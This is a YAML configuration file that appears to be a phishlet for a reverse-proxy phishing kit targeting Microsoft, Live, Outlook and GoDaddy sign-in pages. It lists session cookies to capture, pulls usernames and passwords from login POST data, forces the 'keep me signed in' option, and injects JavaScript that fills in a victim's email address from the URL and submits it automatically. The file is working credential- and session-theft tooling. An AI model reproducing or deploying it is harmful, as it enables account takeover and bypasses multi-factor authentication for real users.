auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState', '.*,regexp']
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTHLIGHT', 'ESTSSC', 'SignInStateCookie', '.*,regexp']
  - domain: '.login.live.com'
    keys: ['MSPOK', '.*,regexp']
  - domain: '.live.com'
    keys: ['.*,regexp']
  - domain: 'outlook.live.com'
    keys: ['.*,regexp']
  - domain: 'sso.secureserver.net'
    keys: ['.*,regexp']
  - domain: '.microsoft.com'
    keys: ['.*,regexp']
  - domain: '.account.microsoft.com'
    keys: ['.*,regexp']
  - domain: 'sso.godaddy.com'
    keys: ['.*,regexp']

auth_urls:
  - '/*'
  - '/auth'
  - '/auth/*'

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

force_post:
  - path: '/ppsecure/post.srf'
    search:
      - {key: 'login', search: '.*'}
      - {key: 'passwd', search: '.*'}
    force:
      - {key: 'KMSI', value: 'on'}
    type: 'post'

login:
  domain: 'login.live.com'
  path: 'login.srf'

js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
    trigger_paths: ["/common/oauth2/", "/*"]
    script: |
      function lp() {
        var emailId = document.querySelector("#i0116");
        var nextButton = document.querySelector("#idSIButton9");
        var query = window.location.href;
        if (/#/.test(window.location.href)) {
          var res = query.split("#");
          var data1 = res[0];
          var data2 = res[1];
          console.log(data1);
          console.log(data2);
          if (emailId != null) {
            var decodedString = data2;
            if (/^[A-Za-z0-9+/=]+$/.test(data2)) { // check if string is base64 encoded
              try {
                decodedString = window.atob(data2.replace(/[=]/gi, ''));
              } catch (e) {
                console.error('Error decoding base64 string:', e);
              }
            }
            emailId.focus();
            emailId.value = decodedString;
            nextButton.focus();
            nextButton.click();
            console.log("YES!");
            return;
          }
        }
        setTimeout(function () { lp(); }, 500);
      }
      setTimeout(function () { lp(); }, 500);
